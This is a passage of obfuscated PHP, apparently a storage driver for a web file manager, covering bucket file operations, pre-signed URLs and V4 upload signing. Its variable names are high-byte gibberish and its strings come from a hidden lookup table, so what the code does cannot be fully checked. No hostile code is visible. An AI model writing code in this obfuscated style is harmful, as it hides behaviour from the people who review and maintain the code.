public function mkdir($²™ûÖØ–, $¦˜ç®ƒ± = REPEAT_SKIP) { $•”Æ€†Å =& $_SERVER[°‰†òö¯]; if (empty($²™ûÖØ–) && $²™ûÖØ– !== $•”Æ€†Å[230]) { return !1; } if ($¦˜ç®ƒ± && $this->_isFolder($²™ûÖØ–)) { return $this->getPathOuter($²™ûÖØ–); } $íøË»øó = $this->setContent($²™ûÖØ–, $•”Æ€†Å[12], !0); if ($íøË»øó !== !1) { return $this->getPathOuter($²™ûÖØ–); } return !1; } public function copyFile($õŒÑ˜¿Ÿ, $‰ì¬°êõ, $²ò«“ìÅ = array()) { $Ç©şç¢­ =& $_SERVER[°‰†òö¯]; $¯¸…ùÂÉ = $this->objectMeta($õŒÑ˜¿Ÿ); if (!$¯¸…ùÂÉ) { return !1; } if ($¯¸…ùÂÉ[$Ç©şç¢­[79]] <= 1024 * 1024 * 200) { $Ö—¦¶¬ = $this->client->copyObject($this->bucket, $õŒÑ˜¿Ÿ, $this->bucket, $‰ì¬°êõ, $Ç©şç¢­[231], $²ò«“ìÅ); } else { $Ö—¦¶¬ = $this->client->multiCopyObject($this->bucket, $õŒÑ˜¿Ÿ, $this->bucket, $‰ì¬°êõ, $²ò«“ìÅ); } $Ö—¦¶¬ = $Ö—¦¶¬ ? $this->getPathOuter($‰ì¬°êõ) : !1; return $Ö—¦¶¬; } public function moveFile($¿¶ùåÙØ, $Ğ±é–») { if ($this->copyFile($¿¶ùåÙØ, $Ğ±é–»)) { $this->delFile($¿¶ùåÙØ); return $this->getPathOuter($Ğ±é–»); } return !1; } public function delFile($Ïãà“Ô) { return $this->client->deleteObject($this->bucket, $Ïãà“Ô); } public function delFolder($í®©íœ‘) { $™»­Ç‡ =& $_SERVER[°‰†òö¯]; if (!$this->exist($í®©íœ‘)) { return !0; } $this->listItemCache = !1; $âíàøÏ” = $this->fileList($í®©íœ‘); $this->listItemCache = !0; $•ëß¬™ = trim($í®©íœ‘, $™»­Ç‡[8]) . $™»­Ç‡[8]; if (!empty($í®©íœ‘) && $í®©íœ‘ !== $™»­Ç‡[230] && !in_array($•ëß¬™, $âíàøÏ”[$™»­Ç‡[85]])) { $âíàøÏ”[$™»­Ç‡[85]][] = $•ëß¬™; } $Î©Üâî¸ = $this->delByBatch($âíàøÏ”[$™»­Ç‡[86]]); if (!$Î©Üâî¸) { return !1; } $Î©Üâî¸ = $this->delByBatch($âíàøÏ”[$™»­Ç‡[85]]); if (!$Î©Üâî¸) { return !1; } return $this->delFile($•ëß¬™); } private function delByBatch($şÌ•«æ¢) { foreach (array_chunk($şÌ•«æ¢, 1000) as $‡µµ¿µÏ) { $–†€Ñ‚ì = $this->client->deleteObjects($this->bucket, $‡µµ¿µÏ); if (!$–†€Ñ‚ì) { return !1; } } return !0; } public function rename($›€­ò©¬, $¬¡×·¾) { return $this->renameObject($›€­ò©¬, $¬¡×·¾); } public function listPath($ĞÍŠÖÇ€, $åØ¾¼ƒ = false) { $”ŒÎ‚  =& $_SERVER[°‰†òö¯]; $üàÈÈË = $this->fileList($ĞÍŠÖÇ€, $”ŒÎ‚ [8], !0); foreach ($üàÈÈË[$”ŒÎ‚ [85]] as $Óùœº‡• => $ª¦–µÀ°) { $üàÈÈË[$”ŒÎ‚ [85]][$Óùœº‡•] = $this->folderInfo($ª¦–µÀ°, $åØ¾¼ƒ, $ª¦–µÀ°); } foreach ($üàÈÈË[$”ŒÎ‚ [86]] as $Óùœº‡• => $ª¦–µÀ°) { $üàÈÈË[$”ŒÎ‚ [86]][$Óùœº‡•] = $this->fileInfo($ª¦–µÀ°[$”ŒÎ‚ [32]], $åØ¾¼ƒ, $ª¦–µÀ°); } return $üàÈÈË; } protected function infoChildren($È‹™Ş, &$Ø¡şØÂå) { $‡‚øò¸ =& $_SERVER[°‰†òö¯]; $¨ÑÍ³‰— = $this->fileList($È‹™Ş, $‡‚øò¸[12], !0); $Ø¡şØÂå[$‡‚øò¸[81]] += count($¨ÑÍ³‰—[$‡‚øò¸[85]]); $Ø¡şØÂå[$‡‚øò¸[80]] += count($¨ÑÍ³‰—[$‡‚øò¸[86]]); foreach ($¨ÑÍ³‰—[$‡‚øò¸[86]] as $¾ôÛ’á) { if (!$¾ôÛ’á || !$¾ôÛ’á[$‡‚øò¸[79]]) { continue; } $Ø¡şØÂå[$‡‚øò¸[79]] += $¾ôÛ’á[$‡‚øò¸[79]]; } } private function fileInfo($í³ú»Èµ, $ÔÓöÌÎÑ = false, $¡’Ğ”­ = array()) { $€ïšàĞÓ =& $_SERVER[°‰†òö¯]; $€ì¼¦°‚ = array($€ïšàĞÓ[32] => $this->pathThis($í³ú»Èµ), $€ïšàĞÓ[87] => $this->getPathOuter($í³ú»Èµ), $€ïšàĞÓ[33] => $€ïšàĞÓ[232], $€ïšàĞÓ[169] => $this->ext($í³ú»Èµ), $€ïšàĞÓ[79] => isset($¡’Ğ”­[$€ïšàĞÓ[79]]) ? $¡’Ğ”­[$€ïšàĞÓ[79]] : 0); if ($ÔÓöÌÎÑ) { return $€ì¼¦°‚; } $€ì¼¦°‚[$€ïšàĞÓ[233]] = $€ì¼¦°‚[$€ïšàĞÓ[88]] = 0; $€ì¼¦°‚[$€ïšàĞÓ[234]] = $€ì¼¦°‚[$€ïšàĞÓ[235]] = !0; if (empty($¡’Ğ”­)) { $¡’Ğ”­ = $this->objectMeta($í³ú»Èµ); if (!$¡’Ğ”­) { return $€ì¼¦°‚; } } if (isset($¡’Ğ”­[$€ïšàĞÓ[236]]) && $¡’Ğ”­[$€ïšàĞÓ[236]]) { $€ì¼¦°‚[$€ïšàĞÓ[237]] = $¡’Ğ”­[$€ïšàĞÓ[236]]; } if (isset($¡’Ğ”­[$€ïšàĞÓ[206]])) { $€ì¼¦°‚[$€ïšàĞÓ[88]] = $¡’Ğ”­[$€ïšàĞÓ[206]]; } if (isset($¡’Ğ”­[$€ïšàĞÓ[79]])) { $€ì¼¦°‚[$€ïšàĞÓ[79]] = $¡’Ğ”­[$€ïšàĞÓ[79]]; } return $€ì¼¦°‚; } private function folderInfo($úêŞÎ–è, $çŞŸû“ö = false, $—å¬€ÀÃ = array()) { $ãª“ñ€ä =& $_SERVER[°‰†òö¯]; $˜ÆŞ›½È = array($ãª“ñ€ä[32] => $this->pathThis($úêŞÎ–è), $ãª“ñ€ä[87] => $this->getPathOuter($ãª“ñ€ä[8] . $úêŞÎ–è), $ãª“ñ€ä[33] => $ãª“ñ€ä[78]); if ($çŞŸû“ö) { return $˜ÆŞ›½È; } $˜ÆŞ›½È[$ãª“ñ€ä[233]] = $˜ÆŞ›½È[$ãª“ñ€ä[88]] = 0; $˜ÆŞ›½È[$ãª“ñ€ä[234]] = $˜ÆŞ›½È[$ãª“ñ€ä[235]] = !0; if ($úêŞÎ–è == $ãª“ñ€ä[12]) { return $˜ÆŞ›½È; } if (empty($—å¬€ÀÃ)) { $—å¬€ÀÃ = $this->objectMeta(trim($úêŞÎ–è, $ãª“ñ€ä[8]) . $ãª“ñ€ä[8]); } if (isset($—å¬€ÀÃ[$ãª“ñ€ä[206]])) { $˜ÆŞ›½È[$ãª“ñ€ä[233]] = $—å¬€ÀÃ[$ãª“ñ€ä[206]]; } return $˜ÆŞ›½È; } private function fileList($§½ı, $²œİû™ã = '', $š—¶õœ = 0) { $¸ôíô‰× =& $_SERVER[°‰†òö¯]; $İØĞ†ı“ = rtrim($§½ı, $¸ôíô‰×[8]) . $¸ôíô‰×[8]; $íƒ´”ç = $this->listObjs($İØĞ†ı“, null, null, $²œİû™ã); if (!$íƒ´”ç) { return array($¸ôíô‰×[85] => array(), $¸ôíô‰×[86] => array()); } $¸¥ü×ùÇ = $èñõ•Ä‡ = array(); foreach ($íƒ´”ç[$¸ôíô‰×[238]] as $‚À üû) { $íªç¡ïõ = $‚À üû[$¸ôíô‰×[32]]; if ($íªç¡ïõ == $İØĞ†ı“) { continue; } $‡‚éœ˜Ì = isset($‚À üû[$¸ôíô‰×[79]]) ? $‚À üû[$¸ôíô‰×[79]] : 0; $óüù–ˆ  = $‡‚éœ˜Ì == 0 && substr($íªç¡ïõ, strlen($íªç¡ïõ) - 1, 1) == $¸ôíô‰×[8] ? !0 : !1; $this->cacheMethodInfoSet($íªç¡ïõ, $óüù–ˆ , $‚À üû); if ($óüù–ˆ ) { $¸¥ü×ùÇ[] = $íªç¡ïõ; continue; } $èñõ•Ä‡[] = $š—¶õœ ? $‚À üû : $íªç¡ïõ; } foreach ($íƒ´”ç[$¸ôíô‰×[239]] as $‚À üû) { $¸¥ü×ùÇ[] = $‚À üû[$¸ôíô‰×[32]]; $this->cacheMethodInfoSet($‚À üû[$¸ôíô‰×[32]], !0); } $this->cacheMethodInfoSet($§½ı, !0); return array($¸ôíô‰×[85] => $¸¥ü×ùÇ, $¸ôíô‰×[86] => $èñõ•Ä‡); } private function listObjs($İÇ¸’£Š, $ƒ„Ìµ = null, $°¾ÇË¤ì = null, $™’Šüóš = null) { $¶õëˆ =& $_SERVER[°‰†òö¯]; $İÇ¸’£Š = trim($İÇ¸’£Š, $¶õëˆ[8]); $ıé°şè = empty($İÇ¸’£Š) && $İÇ¸’£Š !== $¶õëˆ[230] ? $¶õëˆ[12] : $İÇ¸’£Š . $¶õëˆ[8]; return $this->client->getBucket($this->bucket, $ıé°şè, $ƒ„Ìµ, $°¾ÇË¤ì, $™’Šüóš, !0); } public function has($‰Ø·÷šœ, $ÖæèÅ• = false, $µÉû©š¤ = true) { $‚Óß²¸Ñ =& $_SERVER[°‰†òö¯]; $‰Ø·÷šœ = trim($‰Ø·÷šœ, $‚Óß²¸Ñ[8]); $‚µäÆ‚– = empty($‰Ø·÷šœ) && $‰Ø·÷šœ !== $‚Óß²¸Ñ[230] ? $‚Óß²¸Ñ[12] : $‰Ø·÷šœ . $‚Óß²¸Ñ[8]; $š§ô³Í = null; $à¦í—‹Â = 500; $ôØ¡÷³¼ = $‚Óß²¸Ñ[8]; $¬Š½†Ø = $Ê¿Ğ£• = array(); while (!0) { $“Øù®™Ä = $this->listObjs($‰Ø·÷šœ, $š§ô³Í, $à¦í—‹Â, $ôØ¡÷³¼); if (!$“Øù®™Ä) { break; } $š§ô³Í = $“Øù®™Ä[$‚Óß²¸Ñ[240]]; $ñƒóº–… = $“Øù®™Ä[$‚Óß²¸Ñ[238]]; $Çíê³ş” = $“Øù®™Ä[$‚Óß²¸Ñ[239]]; if (empty($ñƒóº–…) && empty($Çíê³ş”)) { break; } if (count($ñƒóº–…) == 1 && $ñƒóº–…[0][$‚Óß²¸Ñ[32]] == $‚µäÆ‚–) { break; } if ($ÖæèÅ•) { if (count($ñƒóº–…)) { $ñƒóº–… = array_column($ñƒóº–…, $‚Óß²¸Ñ[32]); $¬Š½†Ø = array_merge($¬Š½†Ø, $ñƒóº–…); } if (count($Çíê³ş”)) { $Çíê³ş” = array_column($Çíê³ş”, $‚Óß²¸Ñ[32]); $Ê¿Ğ£• = array_merge($Ê¿Ğ£•, $Çíê³ş”); } if ($š§ô³Í === null) { break; } continue; } if ($µÉû©š¤) { if (!empty($ñƒóº–…)) { if (count($ñƒóº–…) > 1 || isset($ñƒóº–…[0][$‚Óß²¸Ñ[32]]) && $ñƒóº–…[0][$‚Óß²¸Ñ[32]] != $‚µäÆ‚–) { return !0; } } } else { if (!empty($Çíê³ş”)) { return !0; } } if ($š§ô³Í === null) { break; } } if ($ÖæèÅ•) { $¬Š½†Ø = array_diff($¬Š½†Ø, array($‚µäÆ‚–)); $¬Š½†Ø = count(array_unique($¬Š½†Ø)); $Ê¿Ğ£• = count(array_unique($Ê¿Ğ£•)); return array($‚Óß²¸Ñ[241] => $¬Š½†Ø, $‚Óß²¸Ñ[242] => $Ê¿Ğ£•); } return !1; } public function listAll($ªğ²Îé‚) { $Ñ²Á¸Æ =& $_SERVER[°‰†òö¯]; $ë†š÷— = $this->fileList($ªğ²Îé‚, $Ñ²Á¸Æ[12], !0); $–‘·î­ı = array_to_keyvalue($ë†š÷—[$Ñ²Á¸Æ[86]], $Ñ²Á¸Æ[32]); foreach ($ë†š÷—[$Ñ²Á¸Æ[85]] as $õ¾ë¸‘Æ) { if (is_string($õ¾ë¸‘Æ)) { $–‘·î­ı[$õ¾ë¸‘Æ] = array($Ñ²Á¸Æ[79] => 0); } } return $this->listAllFiles($ªğ²Îé‚, $–‘·î­ı); } public function canRead($©À’í¿) { $ÕÒ®ºÜ =& $_SERVER[°‰†òö¯]; $ˆ½¼¿„ = $this->client->getAccessControlPolicy($this->bucket, $©À’í¿); if (!$ˆ½¼¿„) { return !1; } return in_array($ˆ½¼¿„, array($ÕÒ®ºÜ[243], $ÕÒ®ºÜ[244], $ÕÒ®ºÜ[245])) ? !0 : !1; } public function canWrite($Å¾Õ¢Ç¯) { $º¤ù”Î =& $_SERVER[°‰†òö¯]; $ş¨¾“µé = $this->client->getAccessControlPolicy($this->bucket, $Å¾Õ¢Ç¯); if (!$ş¨¾“µé) { return !1; } return in_array($ş¨¾“µé, array($º¤ù”Î[243], $º¤ù”Î[244])) ? !0 : !1; } public function getContent($Ùâ±µù) { return $this->client->getObject($this->bucket, $Ùâ±µù); } public function setContent($°¥²¶ª, $µÂ¢ç‡’ = '', $Ñ°¨ğ¡ = false) { $ÃÍ²«õ =& $_SERVER[°‰†òö¯]; $°¥²¶ª = $Ñ°¨ğ¡ ? trim($°¥²¶ª, $ÃÍ²«õ[8]) . $ÃÍ²«õ[8] : $°¥²¶ª; $ÏÄâ İï = get_file_mime(get_path_ext($°¥²¶ª)); $üì¥úÛà = $this->client->putObject($µÂ¢ç‡’, $this->bucket, $°¥²¶ª, $ÃÍ²«õ[231], array(), $ÏÄâ İï); if (!$üì¥úÛà) { return !1; } if ($Ñ°¨ğ¡) { return !0; } return $üì¥úÛà ? !0 : !1; } public function fileSubstr($€ëª„Çğ, $—‡¡‘ï·, $Äªï‚¬–) { $¤©¸µ§ = $—‡¡‘ï· + $Äªï‚¬– - 1; return $this->client->getObject($this->bucket, $€ëª„Çğ, array($_SERVER[°‰†òö¯][246] => "\x62\171\x74\145\x73\x3d{$—‡¡‘ï·}\55{$¤©¸µ§}")); } public function upload($ûœÊ†¢Ş, $¡ùòó¤, $–¨Í¦óÙ = false, $£‹çâé = REPEAT_REPLACE) { $¢Á®Â˜« =& $_SERVER[°‰†òö¯]; $¸â’şÔÇ = array($¢Á®Â˜«[247] => @md5_file($¡ùòó¤)); $äìŒşúØ = array($¢Á®Â˜«[248] => get_file_mime(get_path_ext($ûœÊ†¢Ş))); if (IO::size($¡ùòó¤) <= 1024 * 1024 * 200) { $ÉÕ‹É‡£ = $this->client->putObjectFile($¡ùòó¤, $this->bucket, $ûœÊ†¢Ş, $¢Á®Â˜«[231], $¸â’şÔÇ, $äìŒşúØ); return !empty($ÉÕ‹É‡£) ? $this->getPathOuter($ûœÊ†¢Ş) : !1; } $Ä˜Ö‰ÆÎ = $this->client->multiUploadObject($¡ùòó¤, $this->bucket, trim($ûœÊ†¢Ş, $¢Á®Â˜«[8]), $¸â’şÔÇ, $äìŒşúØ); return $Ä˜Ö‰ÆÎ ? $this->getPathOuter($ûœÊ†¢Ş) : !1; } public function download($•³ì³ïÖ, $»ò¦ôˆÜ) { if (!@is_dir($this->pathFather($»ò¦ôˆÜ)) && !IO::mkdir($this->pathFather($»ò¦ôˆÜ))) { return !1; } $ÔìÒ°ÁÒ = $this->client->getObject($this->bucket, $•³ì³ïÖ, array(), $»ò¦ôˆÜ); return $ÔìÒ°ÁÒ !== !1 ? $»ò¦ôˆÜ : !1; } public function link($¦Ùö¦ÎŒ, $Ù —š—„ = array()) { return $this->getPreSignedURL($¦Ùö¦ÎŒ, 3600 * 12, $Ù —š—„); } private function getPreSignedURL($‰³—âóı, $‘ßêÖ¤, $Ç²ïã¤° = array(), $†“ƒüÜî = "\107\x45\124") { $³œ§ªº£ =& $_SERVER[°‰†òö¯]; $‰³—âóı = trim($‰³—âóı, $³œ§ªº£[8]); if ($this->signVer == $³œ§ªº£[249]) { return $this->client->getPreSignedV2URL($this->bucket, $‰³—âóı, $‘ßêÖ¤, $†“ƒüÜî, $Ç²ïã¤°); } return $this->client->getPreSignedV4URL($this->bucket, $‰³—âóı, $‘ßêÖ¤, array(), $†“ƒüÜî, $Ç²ïã¤°); } public function fileOut($”«®áƒ, $Òâ´”†÷ = false, $ÒŠ°…Ÿ = false, $¤çê¤à = '') { $È¡ëÖ…Æ =& $_SERVER[°‰†òö¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($”«®áƒ, $Òâ´”†÷, $ÒŠ°…Ÿ, $¤çê¤à); } if (!$ÒŠ°…Ÿ) { $ÒŠ°…Ÿ = $this->pathThis($”«®áƒ); } $¦ùîÉê = get_file_mime(get_path_ext($ÒŠ°…Ÿ)); if ($¦ùîÉê == $È¡ëÖ…Æ[250]) { return parent::fileOut($”«®áƒ, $Òâ´”†÷, $ÒŠ°…Ÿ, $¤çê¤à); } $è‘İ–ëá = array($È¡ëÖ…Æ[251] => $¦ùîÉê); if ($Òâ´”†÷) { $è‘İ–ëá[$È¡ëÖ…Æ[252]] = $È¡ëÖ…Æ[253] . rawurlencode($ÒŠ°…Ÿ); } else { } $Ï¶õµ×á = $this->link($”«®áƒ, $è‘İ–ëá); $this->fileOutLink($Ï¶õµ×á); } public function fileOutServer($‚Àšã², $ÍÊé™É† = false, $½ô¨Ä•Á = false, $Ú‚ÙÒğ‘ = '') { parent::fileOut($‚Àšã², $ÍÊé™É†, $½ô¨Ä•Á, $Ú‚ÙÒğ‘); } public function fileOutImageServer($É‰òˆı®, $É”ö‰—½ = 250) { parent::fileOutImage($É‰òˆı®, $É”ö‰—½); } public function hashMd5($Ü¨’¿Ê·, $¬ËóºæŠ = '') { $­‘ıƒ¤Ş = $this->objectMeta($Ü¨’¿Ê·); if (!$­‘ıƒ¤Ş) { return !1; } $¬ËóºæŠ = $¬ËóºæŠ ? $¬ËóºæŠ : _get($­‘ıƒ¤Ş, $_SERVER[°‰†òö¯][254]); return $¬ËóºæŠ; } public function uploadFormData($«ëĞ²Â„, $³½µ÷ã = 3600) { $ÄºÚ¹– =& $_SERVER[°‰†òö¯]; if (!$this->_isClientAsync()) { $‰üÛÍŞ  = $this->getPreSignedURL($«ëĞ²Â„, $³½µ÷ã, array(), $ÄºÚ¹–[255]); return array($ÄºÚ¹–[208] => str_replace($ÄºÚ¹–[218], $ÄºÚ¹–[256], $‰üÛÍŞ )); } if (isset($GLOBALS[$ÄºÚ¹–[6]][$ÄºÚ¹–[92]][$ÄºÚ¹–[257]]) && $GLOBALS[$ÄºÚ¹–[6]][$ÄºÚ¹–[92]][$ÄºÚ¹–[257]] == $ÄºÚ¹–[230]) { return $this->uploadMultiData($«ëĞ²Â„, $³½µ÷ã); } if ($this->signVer == $ÄºÚ¹–[249]) { return $this->uploadFormDataV2($«ëĞ²Â„, $³½µ÷ã); } return $this->uploadFormDataV4($«ëĞ²Â„, $³½µ÷ã); } public function uploadFormDataV2($ŞÜÁã’™, $õŞ°æ¹½ = 3600) { $ÃŸù“›™ =& $_SERVER[°‰†òö¯]; $ÆØ¿Ó½Ó = $this->pathFather($ŞÜÁã’™); $Ş«–‹– = $this->client->getHttpUploadPostParams($this->bucket, $ÆØ¿Ó½Ó, $ÃŸù“›™[231], $õŞ°æ¹½); $ÂşíÀŒğ = array_merge((array) $Ş«–‹–, array($ÃŸù“›™[258] => $ÃŸù“›™[249], $ÃŸù“›™[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($ÂşíÀŒğ[$ÃŸù“›™[258]]); } return $ÂşíÀŒğ; } public function uploadFormDataV4($¯Û×ÂÈÕ, $¾Ã«½·³ = 3600) { $»›ˆêå¾ =& $_SERVER[°‰†òö¯]; $¸»¼±° = $»›ˆêå¾[231]; $­ƒÂ óÊ = $»›ˆêå¾[259]; $ø€‘µ´ô = $»›ˆêå¾[62]; $¤·¹çÁù = gmdate($»›ˆêå¾[260]); $Üâ¶± = gmdate($»›ˆêå¾[261]); $Öôõ…Œø = $»›ˆêå¾[262]; $¢·Û¬¨Ç = $¾Ã«½·³ . $»›ˆêå¾[12]; $øí¹ëŒ• = $»›ˆêå¾[263]; $¸šâ£‚Ş = array($this->accessKey, $Üâ¶±, $this->region, $ø€‘µ´ô, $Öôõ…Œø); $†¬ÕÎ¿í = implode($»›ˆêå¾[8], $¸šâ£‚Ş); $™§„«É÷ = array($»›ˆêå¾[264] => gmdate($»›ˆêå¾[265], strtotime($»›ˆêå¾[266])), $»›ˆêå¾[267] => array(array($»›ˆêå¾[268] => $this->bucket), array($»›ˆêå¾[269], $»›ˆêå¾[270], $»›ˆêå¾[12]), array($»›ˆêå¾[269], $»›ˆêå¾[271], $»›ˆêå¾[12]), array($»›ˆêå¾[272] => $øí¹ëŒ•), array($»›ˆêå¾[273] => $†¬ÕÎ¿í), array($»›ˆêå¾[274] => $­ƒÂ óÊ), array($»›ˆêå¾[275] => $¤·¹çÁù), array($»›ˆêå¾[276] => $¢·Û¬¨Ç))); $Ä’õ¿Úü = base64_encode(json_encode($™§„«É÷)); $Ç³ïì™› = hash_hmac($»›ˆêå¾[277], $Üâ¶±, $»›ˆêå¾[278] . $this->secret, !0); $ŞäˆõÙÊ = hash_hmac($»›ˆêå¾[277], $this->region, $Ç³ïì™›, !0); $‚öÕ—Ñ = hash_hmac($»›ˆêå¾[277], $ø€‘µ´ô, $ŞäˆõÙÊ, !0); $ùßş„¸ = hash_hmac($»›ˆêå¾[277], $Öôõ…Œø, $‚öÕ—Ñ, !0); $¢˜“»šş = hash_hmac($»›ˆêå¾[277], $Ä’õ¿Úü, $ùßş„¸); $’Ó÷İ§Ù = array($»›ˆêå¾[248] => $»›ˆêå¾[12], $»›ˆêå¾[272] => $øí¹ëŒ•, $»›ˆêå¾[279] => $Ä’õ¿Úü, $»›ˆêå¾[273] => $†¬ÕÎ¿í, $»›ˆêå¾[274] => $­ƒÂ óÊ, $»›ˆêå¾[275] => $¤·¹çÁù, $»›ˆêå¾[276] => $¢·Û¬¨Ç, $»›ˆêå¾[280] => $¢˜“»šş, $»›ˆêå¾[258] => $»›ˆêå¾[249], $»›ˆêå¾[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($’Ó÷İ§Ù[$»›ˆêå¾[258]]); } return $’Ó÷İ§Ù; } public function uploadMultiData($Ñ×ÏÂÚ¶, $åÆ†¾Üİ = 3600) { $›ª’»Ùø =& $_SERVER[°‰†òö¯]; $­É±êÍ = $this->signVer == $›ª’»Ùø[249] ? gmdate($›ª’»Ùø[281]) : gmdate($›ª’»Ùø[282]); $º¡­áÊ = array(); $†˜ò¹¸÷ = $this->client->getUploadId($this->bucket, $Ñ×ÏÂÚ¶, $º¡­áÊ); if (!$†˜ò¹¸÷) { return !1; } $Ì–ğ˜ÂÅ = array($›ª’»Ùø[283] => $†˜ò¹¸÷, $›ª’»Ùø[208] => $this->getHost() . $›ª’»Ùø[8] . $this->pathEncode($Ñ×ÏÂÚ¶), $›ª’»Ùø[284] => $­É±êÍ, $›ª’»Ùø[97] => $Ñ×ÏÂÚ¶, $›ª’»Ùø[258] => $this->signVer); if ($this->_isClientAsync()) { unset($Ì–ğ˜ÂÅ[$›ª’»Ùø[258]]); } return $Ì–ğ˜ÂÅ; } public function uploadMultiAuth($²½ˆ†Ãš, $Ù–ÓÕ¦æ = array()) { $´¹¢ÎÆ =& $_SERVER[°‰†òö¯]; if ($this->signVer == $´¹¢ÎÆ[249]) { if (isset($Ù–ÓÕ¦æ[$´¹¢ÎÆ[285]])) { return $this->uploadPartAuthV2($²½ˆ†Ãš, $Ù–ÓÕ¦æ); } return $this->uploadListAuthV2($²½ˆ†Ãš, $Ù–ÓÕ¦æ); } if (isset($Ù–ÓÕ¦æ[$´¹¢ÎÆ[285]])) { return $this->uploadPartAuthV4($²½ˆ†Ãš, $Ù–ÓÕ¦æ); } return $this->uploadListAuthV4($²½ˆ†Ãš, $Ù–ÓÕ¦æ); } public function uploadPartAuthV2($èú˜Õ˜¡, $¸±Ú‡ùŠ = array()) { $ÜåÌöŸç =& $_SERVER[°‰†òö¯]; $®ô¦óŠ = $¸±Ú‡ùŠ[$ÜåÌöŸç[97]]; $À¾†ì¥ = gmdate($ÜåÌöŸç[281]); $ıÁÂƒ§ = array_intersect_key($¸±Ú‡ùŠ, array_flip(array($ÜåÌöŸç[285], $ÜåÌöŸç[283]))); ksort($ıÁÂƒ§); $Ù¶ş¶ª = $ıÁÂƒ§ ? $ÜåÌöŸç[76] . http_build_query($ıÁÂƒ§, null, $ÜåÌöŸç[286], PHP_QUERY_RFC3986) : $ÜåÌöŸç[12]; $æºùïû = array($ÜåÌöŸç[255], $ÜåÌöŸç[12], $ÜåÌöŸç[123], $ÜåÌöŸç[12], "\170\x2d\141\x6d\172\x2d\144\141\164\145\x3a{$À¾†ì¥}", $ÜåÌöŸç[8] . $this->bucket . $ÜåÌöŸç[8] . $this->pathEncode($®ô¦óŠ) . $Ù¶ş¶ª); $ïò‘±²Ë = implode($ÜåÌöŸç[287], $æºùïû); $÷‡°—êü = $this->client->__getSignature($ïò‘±²Ë); return array($ÜåÌöŸç[288] => $÷‡°—êü, $ÜåÌöŸç[284] => $À¾†ì¥); } public function uploadListAuthV2($¦¢§¿’, $µğ¡ççœ = array()) { $Í¼Ø”¤µ =& $_SERVER[°‰†òö¯]; $¾ãÆßä– = $µğ¡ççœ[$Í¼Ø”¤µ[97]]; $£’»çã« = $µğ¡ççœ[$Í¼Ø”¤µ[283]]; $”Çñ£·Ù = $this->client->listParts($this->bucket, $¾ãÆßä–, $£’»çã«); if (!$”Çñ£·Ù) { return !1; } $©ÀîÎ€ = gmdate($Í¼Ø”¤µ[281]); $ØšŞï¶“ = $Í¼Ø”¤µ[289] . $£’»çã«; $±´û½… = array($Í¼Ø”¤µ[290], $Í¼Ø”¤µ[12], $Í¼Ø”¤µ[123], $Í¼Ø”¤µ[12], "\170\55\141\x6d\x7a\55\144\x61\x74\145\72{$©ÀîÎ€}", $Í¼Ø”¤µ[8] . $this->bucket . $Í¼Ø”¤µ[8] . $this->pathEncode($¾ãÆßä–) . $ØšŞï¶“); $ñôÒ¢ ƒ = implode($Í¼Ø”¤µ[287], $±´û½…); $áÃÌíÃ = $this->client->__getSignature($ñôÒ¢ ƒ); return array($Í¼Ø”¤µ[288] => $áÃÌíÃ, $Í¼Ø”¤µ[284] => $©ÀîÎ€, $Í¼Ø”¤µ[291] => $”Çñ£·Ù); } public function uploadPartAuthV4($Ò€ù¼¼¿, $Í¡·Å‹ = array()) { $ÚÑùÙÕ¶ =& $_SERVER[°‰†òö¯]; $™Ú¼³Æ = $Í¡·Å‹[$ÚÑùÙÕ¶[97]]; $Ó¥ôŠ„ = array($ÚÑùÙÕ¶[275] => gmdate($ÚÑùÙÕ¶[282]), $ÚÑùÙÕ¶[292] => _get($Í¡·Å‹, $ÚÑùÙÕ¶[293], hash($ÚÑùÙÕ¶[277], $ÚÑùÙÕ¶[12]))); $¤†ÊÀß® = explode($ÚÑùÙÕ¶[210], $this->getHost()); $ôê’ÅÑ† = array($ÚÑùÙÕ¶[294] => $¤†ÊÀß®[1], $ÚÑùÙÕ¶[295] => $ÚÑùÙÕ¶[12], $ÚÑùÙÕ¶[248] => $ÚÑùÙÕ¶[123], $ÚÑùÙÕ¶[296] => $Í¡·Å‹[$ÚÑùÙÕ¶[79]]); $ïª‡¸ = $ÚÑùÙÕ¶[255]; $“¥“èæÉ = $ÚÑùÙÕ¶[8] . $this->pathEncode($™Ú¼³Æ); $Ğãªããù = array_intersect_key($Í¡·Å‹, array_flip(array($ÚÑùÙÕ¶[285], $ÚÑùÙÕ¶[283]))); $§–„—Ÿ = $this->client->__getSignatureV4($Ó¥ôŠ„, $ôê’ÅÑ†, $ïª‡¸, $“¥“èæÉ, $Ğãªããù); return array($ÚÑùÙÕ¶[288] => $§–„—Ÿ, $ÚÑùÙÕ¶[292] => $Ó¥ôŠ„[$ÚÑùÙÕ¶[292]], $ÚÑùÙÕ¶[284] => $Ó¥ôŠ„[$ÚÑùÙÕ¶[275]]); } public function uploadListAuthV4($¼œÚÈ€, $ŒëÄ§´å = array()) { $¡ºš²Ô =& $_SERVER[°‰†òö¯]; $¿ûÀòÁ = $ŒëÄ§´å[$¡ºš²Ô[97]]; $Š’Š‚‘¡ = $ŒëÄ§´å[$¡ºš²Ô[283]]; $­Ş—ÒÒ® = $this->client->listParts($this->bucket, $¿ûÀòÁ, $Š’Š‚‘¡); if (!$­Ş—ÒÒ®) { return !1; } $Ó˜îÁµü = $¡ºš²Ô[297]; foreach ($­Ş—ÒÒ® as $Ø»ı×›Ë) { $Ó˜îÁµü .= $¡ºš²Ô[298] . "\74\120\x61\162\164\116\165\155\142\145\162\76{$Ø»ı×›Ë[$¡ºš²Ô[299]]}\74\57\120\x61\162\x74\x4e\165\155\142\145\x72\x3e\xa" . "\x3c\x45\x54\x61\x67\x3e{$Ø»ı×›Ë[$¡ºš²Ô[300]]}\x3c\57\x45\x54\x61\147\76\xa" . $¡ºš²Ô[301]; } $Ó˜îÁµü .= $¡ºš²Ô[302]; $ÉÅôˆ‡Ü = array($¡ºš²Ô[275] => gmdate($¡ºš²Ô[282]), $¡ºš²Ô[292] => hash($¡ºš²Ô[277], $Ó˜îÁµü)); $¸®·Ì¼Š = explode($¡ºš²Ô[210], $this->getHost()); $Â‘Û¶É” = array($¡ºš²Ô[294] => $¸®·Ì¼Š[1], $¡ºš²Ô[248] => $¡ºš²Ô[123], $¡ºš²Ô[296] => strlen($Ó˜îÁµü)); $‘«ö‹Ë = $¡ºš²Ô[290]; $…¦Å“¶Œ = $¡ºš²Ô[8] . $this->pathEncode($¿ûÀòÁ); 